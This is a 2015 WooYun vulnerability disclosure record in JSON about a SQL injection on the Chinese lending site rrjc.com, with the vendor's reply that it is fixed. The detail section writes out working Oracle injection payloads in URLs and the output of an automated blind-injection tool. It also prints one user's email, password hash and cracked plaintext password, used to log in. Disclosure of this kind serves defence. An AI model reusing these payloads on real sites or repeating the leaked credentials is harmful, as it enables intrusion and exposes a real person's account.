{"id": 82819, "wybug_id": "wooyun-2015-0149844", "wybug_title": "人人聚财Sql注射漏洞", "wybug_corp": "renrenmoney.com", "wybug_author": "路人甲", "wybug_date": "2015-10-27 15:41", "wybug_open_date": "2015-12-02 11:27", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "17", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-28：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-02：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 存在用户个人数据、项目数据、资金数据等敏感信息泄露 详细说明：  可导致整个网站被脱裤,大量用户个人数据、项目数据、资金数据等敏感信息泄露,严重的可直接通过该账号数据登陆其他互联网平台   漏洞证明：  测试方法:普通用户登录后,访问以下链接可返回个人的交易数据。由于参数 paramMap.transactionType 存在 SQL 注入,可导致整个网站被脱裤,用户个人数据、项目数据、资金数据等敏感信息泄露。1 http://www.rrjc.com/queryFundrecordNewList.do?paramMap.transacti onType=1111111%27\n\n2 http://www.rrjc.com/queryFundrecordNewList.do?paramMap.transacti onType=1' and 0<(SELECT COUNT(*) FROM DUAL) and 'a'='a\n\n3 http://www.rrjc.com/queryFundrecordNewList.do?paramMap.transacti onType=1111111' AND (SELECT length(banner) FROM V$VERSION WHERE ROWNUM=1)>0 or 'Axii'='Axii\n\n4、编写测试脚本进行sql注入取数据库数据\n\n\n\n[*] 注入点:http://www.rrjc.com/queryFundrecordNewList.do?pageBean.pageNum=1&pa ramMap.fundMode=&paramMap.startTime=2015-09-23&paramMap.endTime=2 015-09-24&paramMap.checkType=0&paramMap.transactionType=1111111[*] 数据库版本信息Oracle Database 11g Enterprise Edition Release 11.2.0.3.0 - 64bit Production [*] 数据库用户 RRJC[*] 当前数据库 RRJC[*] 数据库 RRJC 含有 244 个数据表[POC 编写者] Anpro-hacker[风险] 目标 http://www.rrjc.com 存在 oracle 盲注漏洞[详细说明] oracle 盲注漏洞[危害等级] 高[漏洞类别] 注入[程序返回]目标 http://www.rrjc.com 存在 sql 注入数据库版本信息为: Oracle Database 11g Enterprise Edition Release￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼11.2.0.3.0 - 64bit Production 数据库用户为: RRJC 当前数据库为: RRJC数据库 RRJC 含有 244 个数据表 6 提取用户表T_USER数据用户表 T_USER 总共有 510 万多条数据!\n\n部分用户帐户信息：\n\n7、测试登录ID:70账号:33151230@qq.com 账户密码:370915435e8687441d8e9b0df 58540fe交易密码:370915435e8687441d8e9b0df 58540fe370915435e8687441d8e9b0df 58540fe 破解为 zl3728512 使用账号:33151230@qq.com 密码:zl3728512 成功登陆!\n\n\n\n￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼￼   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：16  确认时间：2015-10-28 19:26 厂商回复： 非常感谢，我们已第一时间修复好。我们平台已安全运营3年多，一直有统一的防SQL注入框架服务组件进行加固保护，由于近二天新版上线，我们的防渗透团队正在进行内部安全测试。为了方便找出问题，临时关闭了防SQL注入框架服务组件，还好白帽子同学及时发现，我们立马启动了相关防护服务，用户数据不受影响。 最新状态： 2015-12-02：已修复  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 16, "Ranks": null}